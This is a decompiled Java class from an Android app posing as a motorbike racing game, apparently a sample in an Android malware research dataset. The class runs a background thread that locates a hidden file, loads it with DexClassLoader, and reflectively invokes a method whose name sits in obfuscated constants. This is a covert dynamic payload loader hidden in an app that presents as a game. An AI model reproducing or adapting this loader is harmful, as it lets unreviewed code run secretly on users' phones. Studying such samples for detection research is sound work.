package com.droidhen.game.racingmototerLHL.hnxiw;

import android.content.Context;
import android.content.pm.ActivityInfo;
import android.os.Build;
import android.os.Looper;
import dalvik.system.DexClassLoader;
import java.io.File;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;

/* JADX INFO: Access modifiers changed from: package-private */
/* loaded from: /mnt/c/Users/truon/OneDrive/Desktop/MyWorks/Research4IECgroup/Tasks/Graph-Attention-Networks/dataset/preprocessing/apk_tool/AMD_AndroZoo_demo/dex/a0f226d067098fffd9302f3f2954f7c2.apk/classes.dex */
public class ill extends Thread {
    private String a;
    private String b;
    private String c;
    private String d;
    private String e = "";
    private Context f;

    public ill(Context context, String str, String str2) {
        this.a = "";
        this.b = "";
        this.c = "";
        this.d = "";
        ay.a(11, str);
        this.f = context;
        this.a = str;
        this.d = str2;
        this.b = dem.e + dem.f + dem.i;
        File file = new File(this.b);
        if (!file.exists()) {
            file.mkdirs();
        }
        this.c = dem.e + dem.f + dem.h;
    }

    @Override // java.lang.Thread, java.lang.Runnable
    public void run() {
        this.e = this.c + dem.k + this.a + dem.l;
        try {
            File file = new File(this.e);
            if (!file.exists()) {
                ay.a(12, "0");
            } else if (file.length() > 5120) {
                File file2 = new File(this.b + dem.k + this.a + dem.m);
                if (file2.exists()) {
                    file2.delete();
                }
                ClassLoader parent = ClassLoader.getSystemClassLoader().getParent();
                DexClassLoader dexClassLoader = Build.VERSION.SDK_INT > 15 ? new DexClassLoader(this.e, this.f.getDir("dex", 0).getAbsolutePath(), null, parent) : new DexClassLoader(this.e, this.b, null, parent);
                ActivityInfo[] activityInfoArr = this.f.getPackageManager().getPackageArchiveInfo(this.e, 1).activities;
                if (activityInfoArr != null && activityInfoArr.length > 0) {
                    Looper.prepare();
                    Class loadClass = dexClassLoader.loadClass(activityInfoArr[0].name);
                    Constructor<?>[] constructors = loadClass.getConstructors();
                    if (constructors != null && constructors.length > 0) {
                        Object newInstance = constructors[0].newInstance(new Object[0]);
                        Method declaredMethod = loadClass.getDeclaredMethod(dem.o, Class.forName(dem.p), Class.forName(dem.q));
                        Object[] objArr = {this.f, this.d};
                        declaredMethod.setAccessible(true);
                        declaredMethod.invoke(newInstance, objArr);
                    }
                    Looper.loop();
                    ay.a(12, "1");
                }
            }
        } catch (Exception e) {
            ay.b(3, e.getMessage());
        }
        ay.a(13, "1");
    }
}
